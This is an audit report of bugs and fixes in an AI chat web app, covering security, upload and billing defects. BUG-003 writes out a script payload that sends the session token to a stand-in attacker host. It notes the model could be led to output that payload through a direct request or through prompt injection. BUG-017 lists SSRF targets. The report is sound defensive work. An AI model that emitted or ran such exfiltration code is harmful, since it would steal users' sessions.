# Bug fixes: audit of 2026-09-27

Every bug found during the end-to-end audit, with severity, reproduction, expected vs. actual behaviour, the fix, and the automated test that now guards it.

**Severity scale:** **P0** security or data exposure, or a core feature unusable · **P1** a major feature broken, missing or misleading · **P2** a real defect with a workaround or limited blast radius · **P3** minor, cosmetic, or hardening.

**Summary:** 36 issues logged. All P0, P1 and P2 issues are fixed. Two P3s are deliberately left open pending a product decision (BUG-024, BUG-025). BUG-001 is fixed in the working tree but needs owner action on git history and secrets.

| ID | Sev | Area | Title | Status | Commit |
|---|---|---|---|---|---|
| BUG-001 | P0 | Security | Archive with `.env` files and a database committed to the repo | Fixed in tree; **owner action required** | 82bd096 |
| BUG-002 | P1 | Chat | Streaming error leaked provider name, model id and upstream body | Fixed | 7542d94 |
| BUG-003 | P0 | Code | Preview iframe `allow-scripts allow-same-origin` let generated code read the session token | Fixed | 236f218 |
| BUG-004 | P1 | Code | "Open in new tab" ran generated code on a same-origin `blob:` URL | Fixed | 236f218 |
| BUG-005 | P1 | Image gen | Intent detection misrouted 13 of 28 cases (e.g. "draw conclusions", "image carousel component", code workspace) | Fixed | 409af5b |
| BUG-006 | P1 | Uploads | Anonymous uploads accepted; every upload's text kept forever in an unused in-memory dict | Fixed | 16df05e |
| BUG-007 | P1 | Uploads | PDF/DOCX/XLSX parsed synchronously on the event loop (a big file stalls every request) | Fixed | 16df05e |
| BUG-008 | P2 | PDF | Scanned PDF returned empty text silently; the model saw nothing | Fixed | 16df05e |
| BUG-009 | P2 | Uploads | Corrupted/password-protected files returned empty text or echoed parser exceptions | Fixed | 16df05e |
| BUG-010 | P2 | Uploads | No zip-bomb guard for DOCX/XLSX; no PDF page cap; unbounded sheet iteration | Fixed | 16df05e |
| BUG-011 | P1 | Research | Deep research advertised (Business plan) but not implemented | Implemented | fc1e916, 625eb38 |
| BUG-012 | P1 | Voice | Voice mode was a UI stub (mic and "Start Recording" did nothing) | Implemented | 4aead04, 625eb38 |
| BUG-013 | P1 | Code | Multi-file projects previewed unstyled and without scripts | Fixed | 236f218 |
| BUG-014 | P2 | Code | No way to run JavaScript or Python output ("code execution") | Implemented | 236f218 |
| BUG-015 | P2 | Search | Search query included inlined attachment text (up to 50k chars) | Fixed | 7542d94 |
| BUG-016 | P2 | Search | Search silently skipped when the limit was hit or providers failed | Fixed | 7542d94, 625eb38 |
| BUG-017 | P2 | Search | Snippet enrichment fetched any URL server-side and followed redirects (SSRF) | Fixed | 7542d94 |
| BUG-018 | P2 | Billing | Daily allowance charged even when chat, image or vision failed | Fixed | 409af5b, 16df05e |
| BUG-019 | P2 | Image gen | Images in chats older than 7 days broke (expired media token baked into stored URL) | Fixed | 409af5b |
| BUG-020 | P3 | Image gen | Regenerate returned the identical image (provider caches by URL) | Fixed | 409af5b |
| BUG-021 | P2 | Uploads | Unsupported attachments (zip, pptx, svg…) silently dropped while shown as attached | Fixed | 16df05e |
| BUG-022 | P2 | Vision | Free plan "Analyze" showed "[object Object]" instead of the upgrade flow | Fixed | 16df05e |
| BUG-023 | P2 | Chat | Retry and Regenerate duplicated the user's message | Fixed | 625eb38 |
| BUG-024 | P3 | Plans | Free users get image understanding through chat attachments (plans list Vision as Pro) | **Open, product decision** | – |
| BUG-025 | P3 | API | API-keys gate returns `403 feature_requires_upgrade` instead of standard `402 upgrade_required` | **Open, contract change** | – |
| BUG-026 | P2 | Chat | No limit on message length or attachment count | Fixed | 7542d94 |
| BUG-027 | P2 | Uploads | Attachment chips: all files waited for the slowest; same-name files collided; removed files came back | Fixed | 16df05e |
| BUG-028 | P3 | Chat | Text attachments sent twice in every request | Fixed | 16df05e |
| BUG-029 | P3 | Frontend | `useDebounce` hook was an empty stub | Fixed | 236f218 |
| BUG-030 | P3 | Privacy | Chat request sent the user's email as `userId` (ignored by the server) | Fixed | 625eb38 |
| BUG-031 | P3 | Chat | SSE parser dropped a final event not followed by a newline | Fixed | 625eb38 |
| BUG-032 | P2 | Uploads | Image data URLs not validated server-side (type, encoding, size, count) | Fixed | 16df05e |
| BUG-033 | P2 | Vision | Vision trusted the client's declared content type | Fixed | 16df05e |
| BUG-034 | P2 | Chat | HTTP errors rendered as `⚠️ Failed: HTTP 500: {"detail":…}` raw JSON | Fixed | 625eb38 |
| BUG-035 | P3 | Tooling | 9 ESLint errors; no CI at all | Fixed | 8a437b0, 99b7d5a |
| BUG-036 | P3 | Tests | Test runs wrote uploads into `Backend/uploads/` | Fixed | 99b7d5a |

---

## Details

### BUG-001 · P0 · Archive with `.env` files and a database committed
- **Steps:** `unzip -l vatsaai.com/vatsaai.zip`
- **Expected:** no secrets or user data in the repository.
- **Actual:** the 84 MB archive listed `Backend\.env`, `Backend\vatsa.db`, `Backend\test.db` and `frontend\.env.local`. (Contents were deliberately not opened during the audit.)
- **Fix:** removed the archive plus other stray uploads (`vatsaai-backend-FINAL.zip`, `backend_files.txt`, `Please add`, lint dumps); `*.zip` is now gitignored; CI runs gitleaks on every push and PR. `gitleaks git` over the full history and `gitleaks dir` over the tree found nothing (gitleaks does not look inside zip files, which is why the archive was removed on the listing alone).
- **Owner action still required (cannot be done from a PR):**
  1. Rotate everything those `.env` files could have held: `JWT_SECRET_KEY` (rotating signs everyone out), `OPENROUTER_API_KEY`, SMTP password, OAuth client secrets (Google/GitHub/Microsoft), search API keys, and Razorpay key secret and webhook secret.
  2. Treat the users in `vatsa.db` as exposed (emails, password hashes) and decide on user notification.
  3. Purge history: `git filter-repo --path vatsaai.com/vatsaai.zip --invert-paths` (and the other removed archives), force-push, then ask GitHub support to clear cached views.

### BUG-002 · P1 · Provider details leaked in stream errors
- **Steps:** make every model fail (e.g. no OpenRouter credit), send a chat with `stream: true`.
- **Expected:** a generic retryable error.
- **Actual:** `data: {"error": "All AI models failed. Last error: OpenRouter [402]: {\"error\": \"openai/gpt-4o requires credits\"}"}`, which breaks the product's identity rule and exposes infrastructure.
- **Fix:** the stream yields `{"error": "AI service is temporarily unavailable. Please try again.", "code": "ai_unavailable", "retryable": true}`; the detail is logged server-side.
- **Test:** `tests/test_chat.py::test_provider_failure_never_leaks_provider_details[True|False]` (reproduced failing before the fix).

### BUG-003 · P0 · Generated code could steal the session
- **Steps:** in the code workspace, get the model to output `<script>fetch('https://evil/?t='+localStorage.access_token)</script>` (by asking, or via prompt injection from a pasted page).
- **Expected:** generated code is isolated from the app.
- **Actual:** the preview iframe used `srcDoc` with `sandbox="allow-scripts allow-modals allow-same-origin …"`. A srcdoc frame inherits the app's origin, and with both flags the script reads localStorage (the bearer token) and can even remove its own sandbox.
- **Fix:** `PREVIEW_SANDBOX = "allow-scripts allow-modals allow-forms allow-popups"` (no same-origin). Console output reaches the parent only via `postMessage`, accepted solely from that iframe.
- **Tests:** `preview.test.ts › never grants allow-same-origin`; E2E `code-workspace.spec.ts › …inside an isolated sandbox`. There, generated code tries `localStorage.getItem('access_token')` and `parent.document.title` and the console shows `token:blocked|parent-blocked` in real Chromium, desktop and mobile.

### BUG-004 · P1 · "Open in new tab" ran code with the app's origin
- **Actual:** `window.open(URL.createObjectURL(new Blob([html])))`. `blob:` URLs carry the creator's origin, so the same token theft applies in the new tab.
- **Fix:** the tab opens a wrapper page containing no generated code, which frames the preview in the same opaque-origin sandbox (`buildStandalonePage`).
- **Test:** `preview.test.ts › buildStandalonePage frames the preview in the same sandbox`.

### BUG-005 · P1 · Image generation hijacked normal questions
- **Steps / actual** (old detector, run against the shared case list):

  | Message | Old result |
  |---|---|
  | how do I draw conclusions from this data? | generated an image |
  | draw a comparison between Python and Go | image of "comparison between Python and Go" |
  | draw a bar chart of monthly sales in matplotlib | image |
  | make an image carousel component in React | image of "carousel component in React" |
  | create a picture gallery website | image |
  | create an image classifier with PyTorch | image |
  | generate an image processing pipeline | image |
  | explain the image of a function in set theory | image |
  | what paint should I use for a bathroom? | image |
  | what is in this picture of my receipt | image |
  | design a logo for a coffee shop called Bean There | **no** image (false negative) |
  | code workspace: draw a cat using HTML canvas | image instead of code |
  | code workspace: generate an image of a red fox | image instead of code |

- **Expected:** pictures only for picture requests; never in the code workspace or when a file is attached.
- **Fix:** rewritten detector with a technical-word guard, a "draw X" blocklist, workspace and attachment rules, and prompt cleanup that keeps style words ("a realistic photo of…"). The frontend has an exact mirror; both read `shared/image-intent-cases.json`.
- **Tests:** `tests/test_image_generation.py::test_image_intent_*` (28), `imageQuery.test.ts` (29), E2E `image-generation.spec.ts › a non-image request that mentions drawing…`.

### BUG-006 · P1 · Anonymous uploads and a memory leak
- **Steps:** `curl -F file=@big.pdf $API/api/upload` with no token, repeatedly.
- **Actual:** 200 OK; each upload's full text was stored in the module-level `FILE_STORE` dict, which nothing ever read or evicted. Unauthenticated CPU and memory exhaustion.
- **Fix:** `get_current_user` required, `FILE_STORE` deleted, 30 uploads/min/user rate limit, streamed 25 MB cap.
- **Tests:** `test_upload_requires_auth`, `test_in_memory_store_removed`, `test_upload_rate_limited`, `test_oversized_file_rejected`.

### BUG-007 · P1 · Parsing blocked the event loop
- **Actual:** `extract_text_from_bytes` (pdfplumber etc.) ran directly inside `async def upload_file`, so a 200-page PDF froze all concurrent requests, including streaming chats.
- **Fix:** `await run_in_threadpool(extract_text_from_bytes, …)`, plus page and character budgets.
- **Test:** covered functionally by the PDF suite. A concurrency-timing test was judged too flaky for CI; see the manual check in TEST_REPORT.md.

### BUG-008 · P2 · Scanned PDF silently empty
- **Before:** `{"text": ""}`; the chip said "ready"; the message went out with no document content.
- **After:** `{"text": "", "warning": "No selectable text found. This looks like a scanned or image-only PDF…"}`; the chip shows the error.
- **Tests:** `test_scanned_pdf_returns_warning`, E2E `scanned PDF shows the reason…`.

### BUG-009 · P2 · Unreadable files
- **Before:** a corrupted PDF, DOCX or XLSX returned `""` (logged only), or a generic exception came back as `Could not read file: <python exception text>`.
- **After:** 422 with a specific sentence (corrupted / password-protected / not a valid .docx…).
- **Tests:** `test_corrupted_pdf_returns_clear_error`, `test_encrypted_pdf_returns_clear_error`, E2E `password-protected PDF error…`.

### BUG-010 · P2 · Resource exhaustion via documents
- **Fix:** DOCX/XLSX inflated-size check (200 MB), PDF capped at 300 pages, spreadsheet iteration stops at the 50k-character budget; truncation reported as `truncated: true` with `pages`/`pages_parsed`.
- **Tests:** `test_zip_bomb_docx_refused`, `test_large_pdf_is_page_capped_and_flagged`, `test_long_text_truncated_and_flagged`.

### BUG-011 · P1 · Deep research missing
- **Before:** pricing listed "Deep research: Business ✓" and `feature_access.py` had limits for it, but no endpoint or UI existed.
- **After:** `POST /api/research` (plan → parallel search → cited report, streamed with progress) and a **Research** toggle in the composer (Business; others see the upgrade flow).
- **Tests:** `tests/test_deep_research.py` (21), E2E `deep-research.spec.ts` (3 × 2 viewports).

### BUG-012 · P1 · Voice mode missing
- **Before:** mic buttons with no handler; the empty-state popover's "Start Recording" did nothing.
- **After:** dictation with live transcript, Talk mode (auto-send + read reply aloud), per-message Read aloud, clear errors, and a disabled state on unsupported browsers.
- **Tests:** `voice.test.ts` (12), E2E `voice.spec.ts` (6 × 2 viewports).

### BUG-013 · P1 · Multi-file preview broken
- **Before:** blocks were named `file.html`, `file.css`, `file.js`, while the HTML linked `styles.css`/`script.js` (as the system prompt told the model to). Only the HTML reached the srcdoc, so the page rendered unstyled and inert.
- **After:** real file names detected, referenced CSS/JS inlined, unreferenced ones applied, and `$`-sequences and `</script>` handled safely.
- **Tests:** `parsing.test.ts`, `preview.test.ts › inlineAssets…`, E2E asserts `h1` is red and the script ran.

### BUG-014 · P2 · No code execution
- **After:** a lone JS file runs in a console runner; Python runs via Pyodide in the sandbox; console panel with error badge; Run button.
- **Tests:** `preview.test.ts › runs a lone JavaScript file / runs Python…`, E2E `a lone JavaScript file runs…`.

### BUG-015 · P2 · Search query polluted by attachments
- **Before:** `SearchService.search(req.message)`, where the message contains inlined files (`--- File: … ---` + up to 50k chars).
- **After:** `build_search_query` keeps only the user's words, capped at 400 characters.
- **Tests:** `test_build_search_query_*`.

### BUG-016 · P2 · Silent ungrounded answers
- **Before:** when the search limit was hit or providers failed, the chat answered without results and without saying so.
- **After:** a `notice` event/field, shown as a note on the reply.
- **Tests:** `test_search_quota_exhausted_sends_notice_and_still_answers`, `test_search_outage_sends_notice`, E2E `…notice when search was skipped`.

### BUG-017 · P2 · SSRF in snippet enrichment
- **Before:** the server fetched any result URL with `allow_redirects=True`.
- **After:** only public addresses (every resolved IP must be global), no redirects.
- **Tests:** `test_ssrf_guard_blocks_internal_targets` (8 cases incl. 169.254.169.254, ::1, file://).

### BUG-018 · P2 · Charged for failures
- **Before:** `_enforce_daily_limit` / `require_feature` incremented usage before calling the provider.
- **After:** limits are checked first and usage is recorded only after success (chat, code, image, vision, research).
- **Tests:** `test_provider_failure_returns_502_and_keeps_quota`, `test_vision_failure_does_not_use_quota_or_leak`, `test_writer_failure_does_not_leak_or_charge`.

### BUG-019 · P2 · Old images broke
- **Before:** stored markdown contained `…/preview?token=<media token>`, which expires after `ACCESS_TOKEN_EXPIRE_MINUTES` (7 days).
- **After:** `Conversation.to_dict()` re-signs every preview link with a fresh owner token on read.
- **Test:** `test_stored_image_links_are_resigned_on_read`.

### BUG-020 · P3 · Regenerate gave the same picture
- **Fix:** random `seed` per generation (reused across retries of the same attempt).
- **Tests:** `test_each_generation_uses_a_new_seed`, `test_fetch_retries_transient_failures`.

### BUG-021 · P2 · Attachments silently dropped
- **Before:** any non-text file was read as base64 and sent; the server kept only `image/*`, so a `.zip` or `.pptx` looked attached but the model never saw it.
- **After:** the client rejects unsupported types with the list of supported ones; the server returns 400 for non-image base64 attachments.
- **Tests:** `classifyFile`/`validateFile` unit tests, `test_bad_image_attachments_rejected`, E2E `unsupported and empty files are rejected…`.

### BUG-022 · P2 · "[object Object]" on Analyze
- **Before:** `throw new Error(err.detail)`, where `detail` is the gate object.
- **After:** the 402/429 gate opens the upgrade modal; other errors become readable sentences.
- **Test:** E2E `Analyze image on the free plan opens the upgrade flow`.

### BUG-023 · P2 · Duplicate user message on retry/regenerate
- **Before:** Retry appended the question again beneath the failed bubble; Regenerate truncated to the assistant message (keeping the question) and re-sent it, so the question appeared twice.
- **After:** both truncate from the question and send once.
- **Test:** E2E `provider outage shows a friendly error and Try again recovers` (asserts the question appears once).

### BUG-024 · P3 · Open · Free plan image understanding via chat
Image attachments in chat go to a vision-capable model for every plan, while `/api/vision/analyze` and the plans table treat Vision as Pro. Gating this would remove a capability free users have today, so it is left for a product decision. Recommendation: allow a small daily number of image messages on Free (e.g. 5) under a `vision_chat` limit.

### BUG-025 · P3 · Open · Non-standard API-keys gate
`POST /api/account/api-keys` for Free users returns `403 {"error": "feature_requires_upgrade"}`, while every other gate returns `402 {"error": "upgrade_required"}`. The UI hides API keys on Free, so users don't hit it. Changing the status is a public API contract change and is deferred. The test `test_api_keys_are_a_paid_feature` pins current behaviour.

### BUG-026 · P2 · Unbounded chat input
- **Fix:** `message` ≤ 200,000 chars, `attachments` ≤ 10 (422 otherwise).
- **Test:** `test_oversized_message_rejected`.

### BUG-027 · P2 · Attachment chip races
- **Before:** `Promise.all` meant no chip updated until the slowest file finished; placeholders were replaced by filename, so two `notes.txt` collided and a chip removed mid-processing reappeared.
- **After:** each file replaces its own placeholder by id as soon as it's ready.

### BUG-028 · P3 · Text attachments sent twice
The text was inlined into `message` and also sent as `attachments[].content`, which the server ignored. Now only images carry `content`.
- **Test:** E2E `PDF text is extracted and sent inlined with the message` asserts `content` is absent.

### BUG-029 · P3 · `useDebounce` stub
`export function useDebounce() { useEffect(() => {}, []); return {}; }` is now a real debounce (used by the preview).

### BUG-030 · P3 · Email sent as `userId`
Removed along with the unused `userTier` field; identity always comes from the JWT.
- **Test:** E2E `streams a reply` asserts `userId` is absent.

### BUG-031 · P3 · Final SSE event could be lost
The old loop `break`s on `done` without processing the buffered remainder. Replaced by `createSseParser` with `end()`.
- **Test:** `sse.test.ts › handles a final event without a trailing newline`.

### BUG-032 · P2 · Unvalidated image data URLs
Any string (remote URL, SVG, invalid base64, 50 MB) was forwarded to the model provider. Now: PNG/JPEG/WEBP/GIF base64 only, ≤ 8 MB, ≤ 4 per message.
- **Tests:** `test_bad_image_attachments_rejected` (4 cases), `test_oversized_image_attachment_rejected`, `test_too_many_images_rejected`.

### BUG-033 · P2 · Vision trusted the declared type
A script uploaded with `Content-Type: image/png` was base64-encoded and sent to the model (paid call). Now the bytes are verified with Pillow.
- **Test:** `test_vision_rejects_spoofed_content_type`.

### BUG-034 · P2 · Raw JSON errors in chat
- **Before:** `⚠️ Failed: HTTP 500: {"detail":{...}}`.
- **After:** `describeHttpError` / `describeNetworkError` produce sentences (session expired, offline, too large, temporarily unavailable…).
- **Tests:** `sse.test.ts › describeHttpError…`, E2E `HTTP errors never show raw JSON`.

### BUG-035 · P3 · Lint errors, no CI
9 `react-hooks/set-state-in-effect` errors. The four with a clean alternative were fixed properly (`useHydrated`, derived ThinkingBox state, CommandPalette reset during render); four one-time localStorage/initial-fetch effects carry a targeted disable with a reason. `.github/workflows/ci.yml` added.

### BUG-036 · P3 · Test output in the source tree
`tests/conftest.py` didn't set `DATA_DIR`, so upload tests wrote into `Backend/uploads/`. During this audit that output was committed once by mistake (16df05e) and removed in 99b7d5a; conftest now isolates `DATA_DIR` and `Backend/uploads/` is gitignored.

---

## Also changed (not bugs)

- `fastapi>=0.118` pinned: on 0.106–0.117, yield-dependencies close before a `StreamingResponse` runs, which would detach the DB session used to save streamed chats. On the installed 0.141 streaming persistence works (`test_streaming_happy_path_persists`); the pin prevents a regression on older installs. Not reproduced on an old version.
- Search results cached 10 minutes; image provider responses validated; code-workspace prompt asks for named fences.
- A blank `IMAGE_PROVIDER_URL=` / `SEARCH_CACHE_TTL_SECONDS=` (both introduced during this audit) now means "unset" (3315954).
